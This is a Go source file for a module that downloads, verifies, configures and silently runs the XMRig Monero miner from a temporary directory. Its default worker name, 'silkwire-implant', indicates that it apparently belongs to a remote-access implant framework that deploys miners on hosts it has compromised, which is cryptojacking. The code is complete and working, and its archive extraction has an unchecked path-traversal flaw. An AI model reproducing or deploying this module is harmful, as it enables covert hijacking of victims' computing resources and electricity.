package main

import (
	"archive/tar"
	"archive/zip"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

// XMRigConfig represents the configuration for XMRig
type XMRigConfig struct {
	Pool     string `json:"pool"`
	Wallet   string `json:"wallet"`
	Worker   string `json:"worker,omitempty"`
	Threads  int    `json:"threads,omitempty"`
	Algo     string `json:"algo,omitempty"`
	Coin     string `json:"coin,omitempty"`
	Password string `json:"password,omitempty"`
	TLS      bool   `json:"tls,omitempty"`
}

// XMRigStatus represents the runtime status of XMRig
type XMRigStatus struct {
	Running    bool        `json:"running"`
	PID        int         `json:"pid,omitempty"`
	StartedAt  time.Time   `json:"started_at,omitempty"`
	Config     XMRigConfig `json:"config"`
	BinaryPath string      `json:"binary_path"`
	LogFile    string      `json:"log_file"`
	LastError  string      `json:"last_error,omitempty"`
	Version    string      `json:"version,omitempty"`
}

// XMRigModule implements the Module interface for XMRig cryptocurrency mining
type XMRigModule struct {
	info       ModuleInfo
	config     XMRigConfig
	status     XMRigStatus
	cmd        *exec.Cmd
	mutex      sync.RWMutex
	ctx        context.Context
	cancelFunc context.CancelFunc
	binaryPath string
	configPath string
	logPath    string
}

// XMRigBinaryInfo contains download and verification information
type XMRigBinaryInfo struct {
	URL      string
	SHA256   string
	Filename string
}

// XMRig binary information for different platforms with official SHA256 checksums
var xmrigBinaries = map[string]map[string]XMRigBinaryInfo{
	"linux": {
		"amd64": {
			URL:      "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz",
			SHA256:   "129cfbfbe4c37a970abab20202639c1481ed0674ff9420d507f6ca4f2ed7796a",
			Filename: "xmrig-6.24.0-linux-static-x64.tar.gz",
		},
	},
	"windows": {
		"amd64": {
			URL:      "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip",
			SHA256:   "d0d751a3bc265db85a7bc351a7792068a8c46a002b703624b64b77920f869350",
			Filename: "xmrig-6.24.0-windows-x64.zip",
		},
		"arm64": {
			URL:      "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-arm64.zip",
			SHA256:   "f211aabe350d7e77866720cbf1bd12d8cc6ce544c15572fbf2fa46a10df30f5d",
			Filename: "xmrig-6.24.0-windows-arm64.zip",
		},
	},
	"darwin": {
		"amd64": {
			URL:      "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-macos-x64.tar.gz",
			SHA256:   "cd3026587f710aaa44d58dffeeb7f40cb5acc9d51bebc56f74a578c7fa3d088d",
			Filename: "xmrig-6.24.0-macos-x64.tar.gz",
		},
		"arm64": {
			URL:      "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-macos-arm64.tar.gz",
			SHA256:   "fd41f8936c391a668fff282ba8a348d5722f98e1c70d30c5428559787b99348a",
			Filename: "xmrig-6.24.0-macos-arm64.tar.gz",
		},
	},
}

// NewXMRigModule creates a new XMRig module instance
func NewXMRigModule() *XMRigModule {
	workDir := getWorkingDirectory()

	module := &XMRigModule{
		info: ModuleInfo{
			Name:        "xmrig",
			Description: "XMRig cryptocurrency miner module",
			Version:     "1.0.0",
			Status:      ModuleStatusUnloaded,
		},
		binaryPath: filepath.Join(workDir, getXMRigBinaryName()),
		configPath: filepath.Join(workDir, "xmrig_config.json"),
		logPath:    filepath.Join(workDir, "xmrig.log"),
	}

	module.status.BinaryPath = module.binaryPath
	module.status.LogFile = module.logPath

	return module
}

// getWorkingDirectory returns a suitable working directory for XMRig
func getWorkingDirectory() string {
	if runtime.GOOS == "windows" {
		if temp := os.Getenv("TEMP"); temp != "" {
			return filepath.Join(temp, "xmrig")
		}
		return filepath.Join("C:", "Windows", "Temp", "xmrig")
	}

	// Use /tmp as the default working directory for Unix-like systems
	return filepath.Join("/tmp", "xmrig")
}

// getXMRigBinaryName returns the XMRig binary name for the current platform
func getXMRigBinaryName() string {
	if runtime.GOOS == "windows" {
		return "xmrig.exe"
	}
	return "xmrig"
}

// GetInfo returns basic information about the module
func (x *XMRigModule) GetInfo() ModuleInfo {
	x.mutex.RLock()
	defer x.mutex.RUnlock()
	return x.info
}

// Load initializes the module with given parameters
func (x *XMRigModule) Load(params map[string]interface{}) error {
	x.mutex.Lock()
	defer x.mutex.Unlock()

	// Create working directory
	if err := os.MkdirAll(filepath.Dir(x.binaryPath), 0755); err != nil {
		x.info.LastError = fmt.Sprintf("Failed to create working directory: %v", err)
		x.info.Status = ModuleStatusError
		return err
	}

	// Check if XMRig binary exists, download if not
	if !x.binaryExists() {
		if err := x.downloadXMRig(); err != nil {
			x.info.LastError = fmt.Sprintf("Failed to download XMRig: %v", err)
			x.info.Status = ModuleStatusError
			return err
		}
	}

	// Verify binary
	if err := x.verifyBinary(); err != nil {
		x.info.LastError = fmt.Sprintf("Failed to verify XMRig binary: %v", err)
		x.info.Status = ModuleStatusError
		return err
	}

	x.info.Status = ModuleStatusLoaded
	x.info.LoadedAt = time.Now()
	x.info.LastError = ""

	return nil
}

// Start begins module execution with given parameters
func (x *XMRigModule) Start(params map[string]interface{}) error {
	x.mutex.Lock()
	defer x.mutex.Unlock()

	if x.info.Status != ModuleStatusLoaded && x.info.Status != ModuleStatusStopped {
		return fmt.Errorf("module must be loaded before starting")
	}

	if x.cmd != nil && x.cmd.Process != nil {
		return fmt.Errorf("XMRig is already running")
	}

	// Parse start parameters
	config := XMRigConfig{
		Pool:     "pool.supportxmr.com:443", // Default pool
		Wallet:   "",
		Worker:   "silkwire-implant",
		Threads:  0, // 0 = auto-detect optimal thread count
		Algo:     "rx/0",
		Coin:     "monero", // Default coin
		Password: "x",
		TLS:      false, // Default to non-TLS unless specified
	}

	// Override with provided parameters
	if pool, ok := params["pool"].(string); ok {
		config.Pool = pool
	}
	if wallet, ok := params["wallet"].(string); ok {
		config.Wallet = wallet
	}
	if worker, ok := params["worker"].(string); ok {
		config.Worker = worker
	}
	if threads, ok := params["threads"].(float64); ok {
		config.Threads = int(threads)
	}
	if algo, ok := params["algo"].(string); ok {
		config.Algo = algo
	}
	if coin, ok := params["coin"].(string); ok {
		config.Coin = coin
	}
	if password, ok := params["password"].(string); ok {
		config.Password = password
	}
	if tls, ok := params["tls"].(bool); ok {
		config.TLS = tls
	}

	if config.Wallet == "" {
		return fmt.Errorf("wallet address is required")
	}

	x.config = config
	x.status.Config = config

	// Create XMRig configuration file
	if err := x.createConfigFile(); err != nil {
		x.info.LastError = fmt.Sprintf("Failed to create config file: %v", err)
		x.info.Status = ModuleStatusError
		return err
	}

	// Start XMRig process
	if err := x.startXMRig(); err != nil {
		x.info.LastError = fmt.Sprintf("Failed to start XMRig: %v", err)
		x.info.Status = ModuleStatusError
		return err
	}

	x.info.Status = ModuleStatusRunning
	x.info.StartedAt = time.Now()
	x.status.StartedAt = time.Now()
	x.status.Running = true
	x.info.LastError = ""

	return nil
}

// Stop halts module execution
func (x *XMRigModule) Stop() error {
	x.mutex.Lock()
	defer x.mutex.Unlock()

	if x.cmd == nil || x.cmd.Process == nil {
		x.info.Status = ModuleStatusStopped
		x.status.Running = false
		return nil
	}

	// Cancel context to stop monitoring
	if x.cancelFunc != nil {
		x.cancelFunc()
	}

	// Terminate the process
	if err := x.cmd.Process.Kill(); err != nil {
		x.info.LastError = fmt.Sprintf("Failed to kill process: %v", err)
		return err
	}

	// Wait for process to exit
	_ = x.cmd.Wait()

	x.cmd = nil
	x.info.Status = ModuleStatusStopped
	x.status.Running = false
	x.status.PID = 0
	x.info.LastError = ""

	return nil
}

// Configure updates module configuration
func (x *XMRigModule) Configure(configData []byte) error {
	x.mutex.Lock()
	defer x.mutex.Unlock()

	var config XMRigConfig
	if err := json.Unmarshal(configData, &config); err != nil {
		return fmt.Errorf("invalid configuration JSON: %v", err)
	}

	x.config = config
	x.status.Config = config

	// If running, recreate config file and restart
	if x.info.Status == ModuleStatusRunning {
		if err := x.createConfigFile(); err != nil {
			x.info.LastError = fmt.Sprintf("Failed to update config file: %v", err)
			return err
		}

		// Restart XMRig with new configuration
		if err := x.Stop(); err != nil {
			return err
		}

		params := map[string]interface{}{
			"pool":     config.Pool,
			"wallet":   config.Wallet,
			"worker":   config.Worker,
			"threads":  config.Threads,
			"algo":     config.Algo,
			"coin":     config.Coin,
			"password": config.Password,
			"tls":      config.TLS,
		}

		return x.Start(params)
	}

	return nil
}

// GetStatus returns detailed status information
func (x *XMRigModule) GetStatus() ([]byte, error) {
	x.mutex.RLock()
	defer x.mutex.RUnlock()

	// Update runtime status
	if x.cmd != nil && x.cmd.Process != nil {
		x.status.PID = x.cmd.Process.Pid
		x.status.Running = true
	} else {
		x.status.PID = 0
		x.status.Running = false
	}

	x.status.LastError = x.info.LastError

	return json.Marshal(x.status)
}

// IsRunning returns true if the module is currently running
func (x *XMRigModule) IsRunning() bool {
	x.mutex.RLock()
	defer x.mutex.RUnlock()

	return x.cmd != nil && x.cmd.Process != nil && x.info.Status == ModuleStatusRunning
}

// Helper methods

// binaryExists checks if the XMRig binary exists
func (x *XMRigModule) binaryExists() bool {
	_, err := os.Stat(x.binaryPath)
	return err == nil
}

// downloadXMRig downloads the XMRig binary for the current platform
func (x *XMRigModule) downloadXMRig() error {
	platformBinaries, ok := xmrigBinaries[runtime.GOOS]
	if !ok {
		return fmt.Errorf("unsupported platform: %s", runtime.GOOS)
	}

	binaryInfo, ok := platformBinaries[runtime.GOARCH]
	if !ok {
		return fmt.Errorf("unsupported architecture: %s/%s", runtime.GOOS, runtime.GOARCH)
	}

	// Create temporary directory for download
	tmpDir := filepath.Join(filepath.Dir(x.binaryPath), "tmp")
	if err := os.MkdirAll(tmpDir, 0755); err != nil {
		return fmt.Errorf("failed to create temp directory: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	// Download the archive
	archivePath := filepath.Join(tmpDir, binaryInfo.Filename)
	if err := x.downloadFile(binaryInfo.URL, archivePath); err != nil {
		return fmt.Errorf("failed to download XMRig: %v", err)
	}

	// Verify checksum
	if err := x.verifyChecksum(archivePath, binaryInfo.SHA256); err != nil {
		return fmt.Errorf("checksum verification failed: %v", err)
	}

	// Extract the binary
	if err := x.extractBinary(archivePath, tmpDir); err != nil {
		return fmt.Errorf("failed to extract binary: %v", err)
	}

	// Find the XMRig binary in the extracted archive
	extractedBinary, err := x.findXMRigBinary(tmpDir)
	if err != nil {
		return fmt.Errorf("xmrig binary not found in extracted archive: %v", err)
	}

	// Move binary to final location
	if err := os.Rename(extractedBinary, x.binaryPath); err != nil {
		return fmt.Errorf("failed to move binary: %v", err)
	}

	// Ensure binary is executable
	if err := os.Chmod(x.binaryPath, 0755); err != nil {
		return fmt.Errorf("failed to make binary executable: %v", err)
	}

	return nil
}

// downloadFile downloads a file from the given URL to the specified path
func (x *XMRigModule) downloadFile(url, filepath string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

// verifyChecksum verifies the SHA256 checksum of a file
func (x *XMRigModule) verifyChecksum(filepath, expectedHash string) error {
	file, err := os.Open(filepath)
	if err != nil {
		return err
	}
	defer file.Close()

	hasher := sha256.New()
	if _, err := io.Copy(hasher, file); err != nil {
		return err
	}

	actualHash := hex.EncodeToString(hasher.Sum(nil))
	if actualHash != expectedHash {
		return fmt.Errorf("checksum mismatch: expected %s, got %s", expectedHash, actualHash)
	}

	return nil
}

// extractBinary extracts the XMRig binary from a compressed archive
func (x *XMRigModule) extractBinary(archivePath, destDir string) error {
	if strings.HasSuffix(archivePath, ".tar.gz") {
		return x.extractTarGz(archivePath, destDir)
	} else if strings.HasSuffix(archivePath, ".zip") {
		return x.extractZip(archivePath, destDir)
	}
	return fmt.Errorf("unsupported archive format")
}

// extractTarGz extracts a tar.gz archive
func (x *XMRigModule) extractTarGz(archivePath, destDir string) error {
	file, err := os.Open(archivePath)
	if err != nil {
		return err
	}
	defer file.Close()

	gzr, err := gzip.NewReader(file)
	if err != nil {
		return err
	}
	defer gzr.Close()

	tr := tar.NewReader(gzr)

	for {
		header, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}

		path := filepath.Join(destDir, header.Name)

		switch header.Typeflag {
		case tar.TypeDir:
			if err := os.MkdirAll(path, 0755); err != nil {
				return err
			}
		case tar.TypeReg:
			if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
				return err
			}

			outFile, err := os.Create(path)
			if err != nil {
				return err
			}

			if _, err := io.Copy(outFile, tr); err != nil {
				outFile.Close()
				return err
			}
			outFile.Close()

			// Set permissions
			if err := os.Chmod(path, os.FileMode(header.Mode)); err != nil {
				return err
			}
		}
	}

	return nil
}

// extractZip extracts a zip archive
func (x *XMRigModule) extractZip(archivePath, destDir string) error {
	r, err := zip.OpenReader(archivePath)
	if err != nil {
		return err
	}
	defer r.Close()

	for _, f := range r.File {
		path := filepath.Join(destDir, f.Name)

		if f.FileInfo().IsDir() {
			if err := os.MkdirAll(path, f.FileInfo().Mode()); err != nil {
				return err
			}
			continue
		}

		if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
			return err
		}

		rc, err := f.Open()
		if err != nil {
			return err
		}

		outFile, err := os.Create(path)
		if err != nil {
			rc.Close()
			return err
		}

		_, err = io.Copy(outFile, rc)
		outFile.Close()
		rc.Close()

		if err != nil {
			return err
		}

		// Set permissions
		if err := os.Chmod(path, f.FileInfo().Mode()); err != nil {
			return err
		}
	}

	return nil
}

// findXMRigBinary searches for the XMRig binary in the extracted directory
func (x *XMRigModule) findXMRigBinary(searchDir string) (string, error) {
	binaryName := getXMRigBinaryName()

	// Common paths where XMRig binary might be located
	candidatePaths := []string{
		// Direct in root
		filepath.Join(searchDir, binaryName),
		// In a subdirectory named xmrig
		filepath.Join(searchDir, "xmrig", binaryName),
		// In a bin subdirectory
		filepath.Join(searchDir, "bin", binaryName),
		// In a directory with version number
		filepath.Join(searchDir, "xmrig-6.24.0", binaryName),
	}

	// Try specific patterns based on platform and filename patterns
	if runtime.GOOS == "linux" {
		candidatePaths = append(candidatePaths,
			filepath.Join(searchDir, "xmrig-6.24.0-linux-static-x64", binaryName),
		)
	} else if runtime.GOOS == "windows" {
		if runtime.GOARCH == "amd64" {
			candidatePaths = append(candidatePaths,
				filepath.Join(searchDir, "xmrig-6.24.0-windows-x64", binaryName),
			)
		} else if runtime.GOARCH == "arm64" {
			candidatePaths = append(candidatePaths,
				filepath.Join(searchDir, "xmrig-6.24.0-windows-arm64", binaryName),
			)
		}
	} else if runtime.GOOS == "darwin" {
		if runtime.GOARCH == "amd64" {
			candidatePaths = append(candidatePaths,
				filepath.Join(searchDir, "xmrig-6.24.0-macos-x64", binaryName),
			)
		} else if runtime.GOARCH == "arm64" {
			candidatePaths = append(candidatePaths,
				filepath.Join(searchDir, "xmrig-6.24.0-macos-arm64", binaryName),
			)
		}
	}

	// Check each candidate path
	for _, path := range candidatePaths {
		if info, err := os.Stat(path); err == nil && !info.IsDir() {
			// Verify it's executable (for Unix-like systems)
			if runtime.GOOS != "windows" && info.Mode()&0111 == 0 {
				continue
			}
			return path, nil
		}
	}

	// If not found in common paths, walk the directory tree
	var foundPath string
	err := filepath.Walk(searchDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if !info.IsDir() && info.Name() == binaryName {
			// Verify it's executable (for Unix-like systems)
			if runtime.GOOS != "windows" && info.Mode()&0111 == 0 {
				return nil // continue searching
			}
			foundPath = path
			return io.EOF // stop searching
		}

		return nil
	})

	if err != nil && err != io.EOF {
		return "", fmt.Errorf("error walking directory: %v", err)
	}

	if foundPath != "" {
		return foundPath, nil
	}

	return "", fmt.Errorf("binary '%s' not found in extracted archive", binaryName)
}

// verifyBinary verifies the integrity of the XMRig binary
func (x *XMRigModule) verifyBinary() error {
	// Check if file exists and is executable
	info, err := os.Stat(x.binaryPath)
	if err != nil {
		return err
	}

	if info.Mode()&0111 == 0 {
		return fmt.Errorf("binary is not executable")
	}

	// Try to get version from XMRig to verify it's working
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, x.binaryPath, "--version")
	output, err := cmd.Output()
	if err != nil {
		return fmt.Errorf("binary verification failed: %v", err)
	}

	versionStr := string(output)
	if !strings.Contains(versionStr, "XMRig") {
		return fmt.Errorf("invalid XMRig binary: unexpected version output")
	}

	// Store version information
	lines := strings.Split(versionStr, "\n")
	if len(lines) > 0 {
		x.status.Version = strings.TrimSpace(lines[0])
	}

	return nil
}

// createConfigFile creates the XMRig configuration file
func (x *XMRigModule) createConfigFile() error {
	// Build CPU configuration
	cpuConfig := map[string]interface{}{
		"enabled": true,
	}
	// Only set max-threads-hint if threads > 0, otherwise let XMRig auto-detect
	if x.config.Threads > 0 {
		cpuConfig["max-threads-hint"] = x.config.Threads
	}

	configData := map[string]interface{}{
		"autosave": true,
		"cpu":      cpuConfig,
		"pools": []map[string]interface{}{
			{
				"url":       x.config.Pool,
				"user":      x.config.Wallet,
				"pass":      x.config.Password,
				"rig-id":    x.config.Worker,
				"tls":       x.config.TLS,
				"keepalive": true,
			},
		},
		"log-file":    x.logPath,
		"print-time":  60,
		"retries":     5,
		"retry-pause": 5,
	}

	// Add coin if specified
	if x.config.Coin != "" {
		configData["coin"] = x.config.Coin
	}

	configJSON, err := json.MarshalIndent(configData, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(x.configPath, configJSON, 0644)
}

// startXMRig starts the XMRig process
func (x *XMRigModule) startXMRig() error {
	x.ctx, x.cancelFunc = context.WithCancel(context.Background())

	args := []string{
		"--config=" + x.configPath,
		"--no-color",
		"--donate-level=0",
	}

	// Add coin parameter if specified
	if x.config.Coin != "" {
		args = append(args, "--coin="+x.config.Coin)
	}

	x.cmd = exec.CommandContext(x.ctx, x.binaryPath, args...)

	// Redirect output to log file
	logFile, err := os.OpenFile(x.logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return err
	}

	x.cmd.Stdout = logFile
	x.cmd.Stderr = logFile

	// Start the process
	if err := x.cmd.Start(); err != nil {
		logFile.Close()
		return err
	}

	x.status.PID = x.cmd.Process.Pid

	// Monitor process in background
	go func() {
		defer logFile.Close()
		x.cmd.Wait()

		x.mutex.Lock()
		if x.info.Status == ModuleStatusRunning {
			x.info.Status = ModuleStatusStopped
			x.status.Running = false
			x.status.PID = 0
		}
		x.mutex.Unlock()
	}()

	return nil
}
